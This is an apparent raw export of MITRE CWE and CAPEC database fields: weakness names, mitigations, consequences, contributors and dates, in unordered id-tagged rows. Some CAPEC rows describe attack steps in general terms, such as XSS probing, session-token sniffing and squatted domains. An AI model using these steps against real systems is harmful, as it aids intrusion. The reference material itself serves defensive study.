15325	88	Improper Check for Certificate Revocation
15978	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
13134	40	The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.
18900	54	Medium
13203	26	Architecture and Design
13272	28	CWE Content Team
20017	62	updated Common_Consequences
12012	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
12781	39	2008-07-01
13385	28	CWE Content Team
19805	62	updated Relationships
11240	39	2019-09-19
6104	28	CWE Content Team
14500	62	updated Description, Relationships
8356	28	CWE Content Team
14011	97	Read Sensitive Strings Within an Executable
16359	92	Explore
7338	43	Simple
8868	35	MITRE
18194	104	390
19045	79	Access Control
7363	85	564
9910	35	MITRE
21987	103	Primary
9592	62	updated Applicable_Platforms, Common_Consequences, Description, Name, Other_Notes, Potential_Mitigations, References, Relationships, Research_Gaps, Type
23135	31	1003
24766	28	Eric Dalci
18916	62	updated Name
5839	35	MITRE
25253	72	An attacker could read confidential data if they are able to control resource references.
13247	88	Overly Permissive Cross-domain Whitelist
22636	91	Implementation
20626	96	2018-07-02
7511	79	Authorization
10276	42	Choose a language that provides automatic memory management.
18730	85	112
6602	39	2019-09-19
22707	81	Integrity
10314	55	CAPEC Content Team
10944	23	The software properly checks for the existence of a lock, but the lock can be externally controlled or influenced by an actor that is outside of the intended sphere of control.
12263	81	Confidentiality
7369	39	2008-07-01
14474	103	Primary
16754	32	The Web Application Security Consortium (WASC)
12023	35	MITRE
12254	53	The MITRE Corporation
23391	62	updated Relationships
22682	81	Confidentiality
8155	39	2011-06-01
22877	28	CWE Content Team
22282	62	updated Relationships, Taxonomy_Mappings
18507	50	To avoid HTTP Response Splitting, the application must not rely on user-controllable input to form part of its output response stream. Specifically, response splitting occurs due to injection of CR-LF sequences and additional headers. All data arriving from the user and being used as part of HTTP response headers must be subjected to strict validation that performs simple character-based as well as semantic filtering to strip it of malicious character sequences and headers.
5844	47	Other
20345	79	Confidentiality
22355	56	ChildOf
15283	50	Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.
7075	26	Implementation
24881	76	2019-09-30
20228	55	CAPEC Content Team
9460	26	Implementation
20711	53	The MITRE Corporation
9819	62	updated Description, Name, Potential_Mitigations
7057	73	Assume that a user will incorrectly type the legitimate URL, leading the user to the TypoSquatted domain.
10026	85	6
17363	56	ChildOf
16735	102	ChildOf
6699	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Manual Source Code Review (not inspections)
12273	35	MITRE
12613	28	CWE Content Team
14697	103	Primary
18463	101	CAPEC Content Team
13635	30	G. Hoglund
22288	62	updated Common_Consequences
17009	72	If the value in question is important to data (as opposed to flow), simple data corruption has occurred. Also, if the wrap around results in other conditions such as buffer overflows, further memory corruption may occur.
10488	23	The program invokes a potentially dangerous function that could introduce a vulnerability if it is used incorrectly, but the function can also be used safely.
7095	28	CWE Content Team
25072	25	High
24943	35	MITRE
8982	35	MITRE
21100	35	MITRE
16710	39	2017-11-08
23046	35	MITRE
15275	63	Read Application Data
20464	103	Primary
22959	73	Determine if any other encodings are accepted by the application/system.
18453	104	805
11280	79	Integrity
24591	43	Simple
14490	62	updated Description
15211	28	Eric Dalci
14756	62	updated Potential_Mitigations, References, Relationships
19895	50	Design: Enforce principle of least privilege
21205	95	[Attempt well-known or guessable resource locations] Using an automated tool, an attacker requests a variety of well-known URLs that correspond to administrative, debugging, or other useful internal actions. He records all the positive responses from the server.
17269	39	2012-05-11
21721	62	updated Description, Name
12097	39	2017-11-08
6312	39	2017-11-08
8942	89	Detailed
10243	42	The choice could be made to use a language that is not susceptible to these issues.
14133	21	CWE Content Team
7587	21	CWE Content Team
10606	56	ChildOf
6962	26	Architecture and Design
13130	63	Other
20580	62	updated Relationships
17854	56	ChildOf
8371	39	2008-07-01
7194	35	MITRE
19955	91	Architecture and Design
16783	62	Suggested OWASP Top Ten 2004 mapping
22092	23	The software contains an index range scan for a large data table,      but the scan can cover a large number of rows.
25431	34	Authorization weaknesses may arise when a single-user application is ported to a multi-user environment.
24922	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
11357	28	CWE Content Team
16704	92	Explore
10442	35	MITRE
13518	59	Updated Attack_Phases
24102	47	Gain Privileges
20068	39	2011-06-01
8519	76	2018-07-31
23135	56	ChildOf
20811	51	2014-06-23
9496	63	DoS: Crash, Exit, or Restart
13049	26	Architecture and Design
24493	59	Updated Taxonomy_Mappings
18977	77	Automated Static Analysis
22234	56	ChildOf
8401	43	Simple
8268	35	MITRE
6150	56	ChildOf
15921	80	Denial of service
19118	31	1000
24117	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
24162	35	Cigital
6881	35	MITRE
25259	56	ChildOf
10352	39	2011-06-27
25266	39	2014-07-30
7254	35	MITRE
12684	28	CWE Content Team
11318	47	Read Data
12186	39	2012-05-11
25160	28	CWE Content Team
17500	62	updated Name
9582	39	2017-11-08
23304	62	updated Relationships, Taxonomy_Mappings
11441	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
13408	26	Architecture and Design
19896	48	09
22771	91	Architecture and Design
11925	95	The integer variable is forced to have a value out of range which set its final value to an unexpected value.
9355	45	Class
14236	62	updated Modes_of_Introduction, References, Relationships
24630	103	Primary
20099	35	MITRE
24870	69	Incomplete
23267	31	1000
12763	39	2017-11-08
12124	56	PeerOf
15875	85	410
16391	26	Architecture and Design
11980	91	Implementation
10633	35	MITRE
22463	28	CWE Content Team
6679	21	Anonymous Tool Vendor (under NDA)
10351	28	CWE Content Team
21889	47	Read Data
19566	55	CAPEC Content Team
13149	31	1000
17405	43	Simple
17790	104	311
21111	56	ChildOf
16706	42	Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.
12366	73	Use a list of XSS probe strings using different URI schemes to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier to trace the injected string back to the entry point.
20974	62	updated Common_Consequences
25182	25	High
24627	62	updated Relationships, Taxonomy_Mappings
7820	46	Java objects are expected to obey a number of invariants related to equality. One of these invariants is that equal objects must have equal hashcodes. In other words, if a.equals(b) == true then a.hashCode() == b.hashCode().
17528	46	This issue makes it more difficult to understand and maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
11511	52	This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.                   Specifically, manual static analysis is useful for evaluating the correctness of allocation calculations. This can be useful for detecting overflow conditions (CWE-190) or similar weaknesses that might have serious security impacts on the program.
16277	35	MITRE
12633	103	Primary
24758	79	Availability
14214	78	High
11772	103	Primary
20872	28	CWE Content Team
19548	31	1000
14121	28	CWE Content Team
11597	30	Information Sciences Institute University of Southern California
20662	103	Primary
8568	74	4
5782	42	Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code.                   Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64].
7408	62	updated Observed_Examples, Relationships
12698	56	ChildOf
7268	77	Manual Static Analysis
10536	56	PeerOf
12894	63	Bypass Protection Mechanism
22081	62	updated Time_of_Introduction
12757	23	The adversary influences the target's actions by building a relationship where the target has a liking to the adversary. People are more likely to be influenced by people of whom they are fond, so the adversary attempts to ingratiate his or herself with the target via actions, appearance, or a combination thereof.
12908	62	updated Functional_Areas, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings
11797	61	Draft
8737	24	MITRE
7799	35	MITRE
10155	77	Manual Static Analysis - Source Code
10234	62	updated Potential_Mitigations
24337	103	Primary
9671	43	Simple
21859	46	Numeric calculation using floating point values     can generate imprecise results because of rounding errors.     As a result, two different calculations might generate     numbers that are mathematically equal, but have slightly     different bit representations that do not translate to the     same mathematically-equal values.  As a result, an equality     test or other comparison might produce unexpected     results.     This issue can prevent the software from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.
11928	25	Medium
15433	39	2009-10-29
7707	39	2012-05-11
6903	39	2017-11-08
6105	35	MITRE
14672	78	Low
15591	28	CWE Content Team
6121	62	updated Related_Attack_Patterns
13668	62	updated Potential_Mitigations, Time_of_Introduction
7821	56	ChildOf
18701	103	Primary
9204	79	Confidentiality
12877	62	updated Potential_Mitigations, Time_of_Introduction
12625	39	2009-07-27
23365	79	Authorization
22000	26	Architecture and Design
14389	86	http://www.blakewatts.com/namedpipepaper.html
17240	100	The MITRE Corporation
17844	93	Moderate
10572	103	Primary
12229	42	Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries.                   Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.
18151	25	High
22359	35	MITRE
13656	28	Eric Dalci
24957	45	Variant
16030	81	Integrity
19573	103	Primary
15468	63	Modify Files or Directories
21269	28	CWE Content Team
18371	74	2
19894	28	CWE Content Team
18059	79	Confidentiality
23126	81	Other
10921	49	2002
10580	76	2019-09-30
7547	63	Gain Privileges or Assume Identity
10733	28	CWE Content Team
14506	90	Language-Independent
7239	42	Never set a pointer to a fixed address.
17606	103	Primary
11623	56	CanAlsoBe
10987	56	ChildOf
21020	35	MITRE
8721	55	CAPEC Content Team
18864	24	MITRE
24404	28	CWE Content Team
15980	33	Richard Stanway (r1CH)
19149	62	updated Relationships
6428	79	Non-Repudiation
18204	63	Modify Application Data
20273	61	Draft
7749	43	Simple
13133	40	The protocol or implementations thereof must contain bugs that an adversary can exploit.
10204	79	Integrity
23750	63	Gain Privileges or Assume Identity
18720	72	Cryptographic based authentication systems could be defeated.
20868	35	MITRE
23914	94	A successful DOM-based XSS attack can enable an adversary to exfiltrate sensitive information from the application.
12464	62	updated Relationships
16571	35	MITRE
15261	56	CanPrecede
24204	45	Base
11514	97	Altered Component Firmware
14658	91	Architecture and Design
20113	35	MITRE
5737	62	updated Modes_of_Introduction, Relationships
19486	91	Implementation
17054	28	CWE Content Team
23042	40	An iterative hash function like MD5 and SHA1 is used.
10543	60	02
10994	28	CWE Content Team
16282	62	updated Potential_Mitigations
11029	91	Architecture and Design
9680	73	Inventory all application inputs
14492	72	An attacker could gain access to sensitive data and possibly execute unauthorized code.
16763	56	ChildOf
20779	42	Developers should anticipate that macro symbols will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
10101	62	updated Demonstrative_Examples
12794	28	CWE Content Team
17877	88	Signal Handler Race Condition
17113	51	2014-06-23
8471	103	Primary
15917	46	In heavy load conditions, most J2EE application frameworks flush objects to disk to manage memory requirements of incoming requests. For example, session scoped objects, and even application scoped objects, are written to disk when required. While these application frameworks do the real work of writing objects to disk, they do not enforce that those objects be serializable, thus leaving the web application vulnerable to crashes induced by serialization failure. An attacker may be able to mount a denial of service attack by sending enough requests to the server to force the web application to save objects to disk.
17355	43	Simple
21233	42	When invoking other programs, specify those programs using fully-qualified pathnames. While this is an effective approach, code that uses fully-qualified pathnames might not be portable to other systems that do not use the same pathnames. The portability can be improved by locating the full-qualified paths in a centralized, easily-modifiable location within the source code, and having the code refer to these paths.
25162	28	Eric Dalci
13449	74	3
12975	39	2011-06-01
23976	39	2019-06-20
15325	43	Simple
19078	43	Simple
9785	89	Detailed
12825	73	The attacker sets up a sniffer in the path between the server and the client.
15633	96	2014-02-13
21569	54	Medium
9104	23	An adversary conducts a physical attack a device or component, destroying it such that it no longer functions as intended.
16292	81	Integrity
13211	39	2019-01-03
14453	28	CWE Content Team
20025	35	MITRE
6675	28	CWE Content Team
22403	78	Very High
24748	39	2019-06-20
21795	25	Low
24481	62	updated Relationships, Taxonomy_Mappings
19715	39	2014-06-23
21375	28	CWE Content Team
10379	76	2018-07-31
12299	71	2014
6852	28	CWE Content Team
21039	42	Use naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.
6416	56	ChildOf
12712	39	2012-05-11
7227	96	2018-07-02
8329	45	Variant
12621	72	An attacker could gain privileges by modifying or reading critical data directly, or by accessing privileged functionality.
6263	91	Architecture and Design
20074	69	Incomplete
13436	39	2012-05-11
8838	59	Updated Attacker_Skills_or_Knowledge_Required, Description Summary
13820	31	699
7454	28	CWE Content Team
21714	101	CAPEC Content Team
8418	90	Language-Independent
10141	63	Alter Execution Logic
8545	56	ChildOf
23921	51	2017-01-04
19322	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
20718	53	The MITRE Corporation
15560	35	MITRE
22123	103	Primary
19180	62	updated Relationships
8982	39	2017-11-08
18248	55	CAPEC Content Team
13072	39	2009-12-28
24764	42	Many XML parsers and validators can be configured to disable external entity expansion.
19132	39	2015-12-07
22263	39	2008-07-01
14057	62	updated Common_Consequences
16887	56	ChildOf
6426	35	MITRE
20478	35	MITRE
11357	39	2011-06-01
14110	28	CWE Content Team
22680	30	Mark Wolfgang
11411	39	2011-03-29
18153	95	[Determine which functionality to disable or remove] The attacker tries to determine which functionality to disable or remove through reverse-engineering from the list of functionality identified in the Explore phase.
17350	35	MITRE
13323	50	Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.
15490	61	Draft
9749	100	The MITRE Corporation
12496	28	CWE Content Team
15508	101	CAPEC Content Team
9911	35	MITRE
21067	35	MITRE
20325	31	1000
20345	47	Read Data
17663	35	MITRE
7025	47	Read Data
18484	102	ChildOf
17407	90	C++
9732	104	610
22073	28	CWE Content Team
16590	81	Confidentiality
16201	21	7 Pernicious Kingdoms
22792	28	CWE Content Team
11439	35	MITRE
11677	31	1000
5960	100	The MITRE Corporation
10848	39	2008-09-08
14778	28	CWE Content Team
23808	39	2010-04-05
19128	39	2014-07-30
22482	96	2009-03-03
7399	94	The adversary is potentially able to identify the location of sensitive information or lateral pathways through the network.
24247	33	Jeremiah Grossman
17394	53	The MITRE Corporation
8418	69	Draft
16944	103	Primary
19311	69	Incomplete
12304	73	Attacker uses an automated tool to crawl application identify file inputs
8257	35	MITRE
12227	28	CWE Content Team
15295	28	CWE Content Team
23878	42	Use thread-safe capabilities such as the data access abstraction in Spring.
16285	53	The MITRE Corporation
22927	28	CWE Content Team
8159	23	An adversary exploits a weakness in the system maintenance process and causes a change to be made to a technology, product, component, or sub-component or a new one installed during its deployed use at the victim location for the purpose of carrying out an attack.
15291	26	Implementation
16795	58	A cursor is a feature in Oracle PL/SQL and other languages that provides a handle for executing and accessing the results of SQL queries.
16974	35	MITRE
19315	62	updated Relationships, Relationship_Notes, Taxonomy_Mappings
8304	93	High
22259	35	MITRE
16572	28	CWE Content Team
21947	103	Primary
13461	62	updated Relationships, Taxonomy_Mappings
18214	28	CWE Content Team
13109	66	Black Hat EU 2010 - Attacking Java Serialized Communication
10615	63	Bypass Protection Mechanism
24342	48	12
25004	67	High
16722	51	2014-06-23
10853	103	Primary
15308	62	updated Potential_Mitigations, References, Relationships
8767	39	2011-06-27
17930	47	Read Data
22736	47	Hide Activities
20938	45	Variant
14765	39	2008-10-14
18233	30	J. Postel
22550	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
11817	39	2009-01-12
6820	39	2011-06-01
17989	42	Consider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource.
23495	39	2008-11-24
23032	63	DoS: Resource Consumption (CPU)
9563	70	Malware Protection Center: Threat Research and Response
21723	80	An attacker can try special characters in the URL and bypass the URL validation.
11788	35	MITRE
9324	33	David Dewey
17728	104	628
12664	81	Integrity
24177	35	MITRE
17078	103	Primary
8159	85	440
20782	102	ChildOf
5833	62	updated Applicable_Platforms, Demonstrative_Examples
23358	63	Modify Files or Directories
20438	35	MITRE
14313	79	Confidentiality
23347	63	Read Files or Directories
5938	21	PLOVER
5802	88	Use of Externally-Controlled Format String
15067	44	Moderate
8057	26	Implementation
16938	28	CWE Content Team
13573	47	Gain Privileges
15885	62	updated Causal_Nature, Taxonomy_Mappings
23795	94	If constructed properly, a buffer manipulation attack can be used to contol the execution of the application leading to any number of negative consequenses.
21732	91	Implementation
20143	28	CWE Content Team
11423	56	ChildOf
18312	21	PLOVER
25298	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
10683	47	Other
24973	62	updated Common_Consequences
7973	28	CWE Content Team
22798	56	ChildOf
23765	35	MITRE
24050	56	ChildOf
6855	40	The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.
24840	91	Architecture and Design
8099	62	updated Relationships
18939	28	CWE Content Team
19111	28	CWE Content Team
16852	62	updated Common_Consequences
13592	35	MITRE
18588	45	Base
7690	89	Detailed
11474	62	updated Potential_Mitigations
15923	39	2008-09-08
21349	31	1000
18381	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
15597	39	2012-05-11
14961	81	Availability
19101	62	updated Related_Attack_Patterns, Relationships
23461	31	1000
14365	54	Low
9385	28	Eric Dalci
21716	50	An organization should provide regular, robust cybersecurity training to its employees to prevent successful social engineering attacks.
11845	63	Bypass Protection Mechanism
10702	25	High
7510	47	Resource Consumption
12331	62	updated Likelihood_of_Exploit, Modes_of_Introduction, Potential_Mitigations, References, Relationships
11416	28	CWE Content Team
18834	35	MITRE
20941	62	updated Detection_Factors
8298	56	ChildOf
14423	62	updated Description, Relationships
5831	63	Modify Memory
23377	79	Confidentiality
5913	26	Implementation
17334	103	Primary
12366	74	2
9734	76	2018-07-31
20786	90	Language-Independent
25203	62	updated Common_Consequences, Relationships
24497	26	Architecture and Design
15335	100	The MITRE Corporation
17591	81	Availability
16262	39	2008-07-01
19749	88	Function Call With Incorrect Variable or Reference as Argument
17810	39	2019-01-03
17907	63	DoS: Crash, Exit, or Restart
20994	62	updated Description, Relationships
21846	35	Cigital
23787	62	updated Relationships, Taxonomy_Mappings
20946	56	ChildOf
25377	21	CWE Content Team
18548	95	[Use unauthorized resources] By visiting the unprotected resource, the attacker makes use of unauthorized functionality.
14983	35	MITRE
25230	69	Draft
17337	49	2012
9506	66	Safe C String Library v1.0.3
24622	44	SOAR Partial
24991	59	Updated Description Summary, Examples-Instances, References
18398	62	updated Potential_Mitigations
15325	104	299
16724	62	updated Relationships
22817	28	Eric Dalci
20417	95	[File misclassification sniping] Understanding how certain file types are processed by web servers, an attacker crafts varying file payloads and modifies their file extension or MIME type to be that of the targeted type to see if the web server is vulnerable to misclassification of that type.
16236	95	[Impersonate trusted domain] In order to impersonate the trusted domain, the adversary needs to register the SoundSquatted URL.
10039	81	Integrity
14282	39	2011-03-29
23184	43	Simple
20534	42	Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.
21483	62	updated Relationships
16698	23	Wrap around errors occur whenever a value is incremented past the maximum value for its type and therefore "wraps around" to a very small, negative, or undefined value.
6776	77	White Box
9469	21	PLOVER
20998	62	updated Relationships, Taxonomy_Mappings, Type
15371	53	The MITRE Corporation
9678	85	520
22284	35	Cigital
16804	62	updated Time_of_Introduction
24885	39	2009-10-29
12753	23	The application subtracts one pointer from another in order to determine size, but this calculation can be incorrect if the pointers do not exist in the same memory chunk.
6560	56	ChildOf
22712	55	CAPEC Content Team
7919	81	Availability
13355	43	Simple
14860	31	699
13562	28	CWE Content Team
19215	103	Primary
19821	91	Implementation
19454	31	1000
14175	50	Re-architect system input/output channels as appropriate to distribute self-protecting data. That is, encrypt (or otherwise protect) channels/messages so that only authorized readers can see them.
6649	62	updated Relationships, Taxonomy_Mappings
6727	35	MITRE
15959	81	Confidentiality
6425	62	updated Common_Consequences
7572	60	22
20206	39	2012-05-11
16956	26	Architecture and Design
16069	28	CWE Content Team
15478	63	Bypass Protection Mechanism
25367	75	False negatives may occur if the tool is not aware of the cryptographic libraries in use, or if custom cryptography is being used.
16381	77	Manual Static Analysis - Source Code
14731	62	updated Demonstrative_Examples, Modes_of_Introduction, Relationships
9613	62	updated Alternate_Terms, Applicable_Platforms, Common_Consequences, Description, Relationships, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities
7490	28	CWE Content Team
17850	28	CWE Content Team
20647	76	2017-01-09
22313	35	MITRE
12050	44	Moderate
16617	91	Implementation
22881	62	updated Relationships
23042	40	Web services check the signature of the API calls
7269	67	Medium
13244	79	Access Control
16960	70	The Official Social Engineering Portal
21964	86	http://csrc.nist.gov/nissc/1996/papers/NISSC96/paper057/PAPER.PDF
10331	30	Walid Negm
8055	39	2008-09-08
18208	95	The attacker finds a buffer overflow vulnerability in the command utility and tries to exploit it. He crafts malicious code and injects it using the command utility. The attacker can at worst execute remote code on the target host.
17995	101	CAPEC Content Team
19399	62	updated Common_Consequences
15349	21	Evgeny Lebanidze
15830	76	2015-11-09
16698	90	C++
23796	62	updated Common_Consequences
7671	35	MITRE
7859	97	Manipulating Writeable Configuration Files
15493	39	2009-07-27
16150	72	If unused fields are not validated, shared business logic in an action may allow attackers to bypass the validation checks that are performed for other uses of the form.
19071	50	All user controllable input must be appropriately sanitized before use in the application. This includes omitting, or encoding, certain characters or strings that have the potential of being interpreted as part of an SSI directive
10927	62	updated Relationships
15117	28	Sean Eidemiller
11903	61	Draft
23271	39	2011-06-27
24142	55	CAPEC Content Team
24256	23	The attacker directly or indirectly modifies environment variables used by or controlling the target software. The attacker's goal is to cause the target software to deviate from its expected operation in a manner that benefits the attacker.
8042	35	MITRE
7114	49	2007
7944	100	The MITRE Corporation
12580	54	Medium
20986	28	CWE Content Team
11117	28	CWE Content Team
7237	35	MITRE
11263	62	updated Relationships
14175	40	Information and client-sensitive (and client-specific) data must be present through a distribution channel available to all users.
21259	69	Draft
19661	62	updated Time_of_Introduction
17117	40	This type of an attack requires the attacker to be able to generate fragmented IP traffic containing crafted data.
6726	46	This weakness typically occurs when an unexpected value is provided to the product, or if an error occurs that is not properly detected. It frequently occurs in calculations involving physical dimensions such as size, length, width, and height.
8285	39	2011-09-13
17159	23	The product's documentation does not adequately define inputs,      outputs, or system/software interfaces.
22009	43	Simple
19002	39	2009-03-10
23814	28	CWE Content Team
21027	39	2017-11-08
10539	69	Incomplete
17638	62	updated Common_Consequences
22893	35	MITRE
12103	59	Updated @Abstraction
16006	80	Able to develop and manufacture malicious subroutines for an ASIC environment without degradation of existing functions and processes.
11146	39	2012-05-11
15893	35	MITRE
24259	28	CWE Content Team
14924	56	ChildOf
24161	24	MITRE
23689	104	160
8817	31	699
23078	104	331
22707	81	Authentication
16078	62	updated Relationships
19462	25	Low
9513	39	2014-07-30
12455	62	updated Common_Consequences
14597	62	updated References, Relationships, Taxonomy_Mappings
11771	62	updated Potential_Mitigations
12058	35	MITRE
13060	42	Canonicalize the name to match that of the file system's representation of the name. This can sometimes be achieved with an available API (e.g. in Win32 the GetFullPathName function).
10006	96	2010-01-15
9130	100	The MITRE Corporation
22581	35	MITRE
21661	60	07
6566	39	2014-02-18
15256	100	The MITRE Corporation
14310	88	Inaccurate Comments
9916	50	Strong physical security of all devices that contain secret key information. (even when devices are not in use)
22743	39	2010-04-05
23969	42	Handle exceptions internally and do not display errors containing potentially sensitive information to a user.
15449	21	PLOVER
10605	35	MITRE
11399	88	Insufficient Compartmentalization
8010	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
7307	60	31
12930	100	The MITRE Corporation
12623	42	Mitigation of resource exhaustion attacks requires that the target system either:                                                                  recognizes the attack and denies that user further access for a given amount of time, typically by using increasing time delays                         uniformly throttles all requests in order to make it more difficult to consume resources more quickly than they can again be freed.                                                            The first of these solutions is an issue in itself though, since it may allow attackers to prevent the use of the system by a particular valid user. If the attacker impersonates the valid user, they may be able to prevent the user from accessing the server in question.                   The second solution can be difficult to effectively institute -- and even when properly done, it does not provide a full solution. It simply requires more resources on the part of the attacker.
14410	35	MITRE
24797	42	An application must make network resources available to a client commensurate with the client's access level.
8535	77	Manual Analysis
7075	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
24183	39	2011-06-01
9167	28	CWE Content Team
22339	61	Draft
9210	72	Logging sensitive user data often provides attackers with an additional, less-protected path to acquiring the information.
9555	95	[Capture session token] The attacker uses sniffing tools to capture a session token from traffic.
11581	39	2008-07-01
18572	39	2008-11-24
7725	35	MITRE
24201	28	CWE Content Team
22001	100	The MITRE Corporation
10319	62	updated Relationships, Taxonomy_Mappings
6535	103	Primary
6770	28	CWE Content Team
7266	23	The software uses a cookie to store sensitive information, but the cookie is not marked with the HttpOnly flag.
12242	28	CWE Content Team
20443	74	2
17401	40	The administrator must have failed to properly configure an ACL or has associated an overly permissive ACL with a particular directory.
21291	59	Updated References, Related_Attack_Patterns, Typical_Likelihood_of_Exploit
21154	62	updated Related_Attack_Patterns
19780	70	XML Parser Attacks: A summary of ways to attack an XML Parser
10813	39	2011-06-01
8981	80	Ability to develop, deploy, and maintain a stealth malicious backdoor program remotely in what is essentially a hostile environment.
6652	46	This issue makes it more difficult to understand and maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.   While the interpetation of "large number of children" may vary for each product or developer, CISQ recommends a default maximum of 10 child classes.
7450	26	Architecture and Design
24032	91	Implementation
24756	62	updated Potential_Mitigations
7366	104	541
19577	28	CWE Content Team
23811	43	Simple
14269	28	Eric Dalci
6390	61	Draft
23811	23	The software does not properly prevent access to, or detect usage of, alternate data streams (ADS).
23594	28	CWE Content Team
6861	91	Architecture and Design
15485	74	1
9275	28	CWE Content Team
7306	23	The software's resource pool is not large enough to handle peak demand, which allows an attacker to prevent others from accessing the resource by using a (relatively) large number of requests for resources.
23252	104	1046
9316	43	Simple
23572	42	Do not write user-controlled input to error pages.
14456	101	CAPEC Content Team
20985	35	MITRE
17466	89	Detailed
19654	30	Shreeraj Shah
13247	105	Web Based
21240	102	ChildOf
14954	39	2008-10-14
13285	96	2018-07-02
7567	26	Implementation
21285	43	Simple
19236	62	updated Common_Consequences, Observed_Examples, Related_Attack_Patterns, Relationships
15010	39	2012-05-11
20118	79	Confidentiality
7557	46	This can lead to an unexpected system state with a variety of potential consequences depending on context, including denial of service and code execution.             Signal handlers are typically intended to interrupt normal functionality of a program, or even other signals, in order to notify the process of an event. When a signal handler uses global or static variables, or invokes functions that ultimately depend on such state or its associated metadata, then it could corrupt system state that is being used by normal functionality. This could subject the program to race conditions or other weaknesses that allow an attacker to cause the program state to be corrupted. While denial of service is frequently the consequence, in some cases this weakness could be leveraged for code execution.             There are several different scenarios that introduce this issue:                                                Invocation of non-reentrant functions from within the handler. One example is malloc(), which modifies internal global variables as it manages memory. Very few functions are actually reentrant.                   Code sequences (not necessarily function calls) contain non-atomic use of global variables, or associated metadata or structures, that can be accessed by other functionality of the program, including other signal handlers. Frequently, the same function is registered to handle multiple signals.                   The signal handler function is intended to run at most one time, but instead it can be invoked multiple times. This could happen by repeated delivery of the same signal, or by delivery of different signals that have the same handler function (CWE-831).                                          Note that in some environments or contexts, it might be possible for the signal handler to be interrupted itself.             If both a signal handler and the normal behavior of the software have to operate on the same set of state variables, and a signal is received in the middle of the normal execution's modifications of those variables, the variables may be in an incorrect or corrupt state during signal handler execution, and possibly still incorrect or corrupt upon return.
23203	62	updated Common_Consequences
13780	72	In some cases, injectable code controls authentication; this may lead to a remote vulnerability.
19388	103	Primary
13143	35	MITRE
23200	44	High
22213	39	2009-07-27
17287	79	Integrity
